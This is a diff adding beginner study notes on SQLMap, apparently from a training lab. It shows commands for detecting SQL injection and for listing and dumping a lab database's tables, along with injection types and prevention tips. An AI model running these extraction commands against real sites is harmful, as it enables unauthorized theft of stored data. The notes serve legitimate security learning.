@@ -92,3 +92,115 @@ Think of SQL injection like breaking into a locked door:
 
 
 
+### **Automated SQL Injection with SQLMap**
+
+
+#### **What is SQLMap?**
+- **SQLMap** is an automated tool to detect and exploit SQL injection vulnerabilities in web applications.
+- Simplifies the process of finding and exploiting vulnerabilities.
+- Available as a command-line tool in Linux (can be installed if not pre-installed).
+
+
+#### **How to Use SQLMap**
+
+1. **Interactive Wizard Mode**:
+   - Use the `--wizard` flag for beginners.
+   - SQLMap guides you step-by-step.
+   - Example:
+     ```bash
+     sqlmap --wizard
+     ```
+
+2. **Basic Syntax**:
+   - Test a URL for SQL injection:
+     ```bash
+     sqlmap -u <URL>
+     ```
+   - Example:
+     ```bash
+     sqlmap -u http://sqlmaptesting.thm/search/cat=1
+     ```
+
+3. **Extracting Database Information**:
+   - **List all databases**:
+     ```bash
+     sqlmap -u <URL> --dbs
+     ```
+   - Example Output:
+     ```
+     [*] users
+     [*] members
+     ```
+
+4. **Extracting Tables**:
+   - List tables in a specific database:
+     ```bash
+     sqlmap -u <URL> -D <database_name> --tables
+     ```
+   - Example:
+     ```bash
+     sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+     ```
+
+5. **Dumping Table Data**:
+   - Extract records from a specific table:
+     ```bash
+     sqlmap -u <URL> -D <database_name> -T <table_name> --dump
+     ```
+   - Example:
+     ```bash
+     sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
+     ```
+   - Example Output:
+     ```
+     +---------------------+------------+---------+
+     | Date                | name       | pass    |
+     +---------------------+------------+---------+
+     | 09/09/2024          | Thomas THM | testing |
+     +---------------------+------------+---------+
+     ```
+
+
+#### **Types of SQL Injection Detected**
+- **Boolean-Based Blind**:
+  - Modifies queries with boolean expressions (e.g., `1=1`) to extract data.
+- **Error-Based**:
+  - Intentionally causes errors to gather information about the database.
+- **Time-Based Blind**:
+  - Uses delays (e.g., `SLEEP(5)`) to infer data.
+- **UNION Query**:
+  - Combines results of multiple queries to extract data.
+
+#### **POST-Based Testing**
+- For forms (e.g., login, registration), intercept the POST request using tools like Burp Suite.
+- Save the intercepted request as a text file and use SQLMap:
+  ```bash
+  sqlmap -r intercepted_request.txt
+  ```
+
+
+#### **Why Use SQLMap?**
+- Automates the detection and exploitation of SQL injection vulnerabilities.
+- Saves time compared to manual testing.
+- Provides detailed information about databases, tables, and records.
+
+
+#### **Preventing SQL Injection**
+- Use **prepared statements** or **parameterized queries**.
+- Validate and sanitize user input.
+- Limit database permissions.
+- Use Web Application Firewalls (WAFs).
+
+
+### **Remembering Tips**
+Think of SQLMap as a "digital locksmith":
+- It tests doors (URLs/forms) to see if they’re locked properly.
+- If it finds a weak lock (vulnerability), it opens it and shows what’s inside (data).
+- Always use this tool responsibly and only on systems you own or have permission to test.
+
+### **Summary**
+- **SQLMap** automates SQL injection detection and exploitation.
+- Use flags like `--dbs`, `--tables`, and `--dump` to extract data.
+- Supports both GET and POST-based testing.
+- Helps identify vulnerabilities like boolean-based blind, error-based, and UNION queries.
+
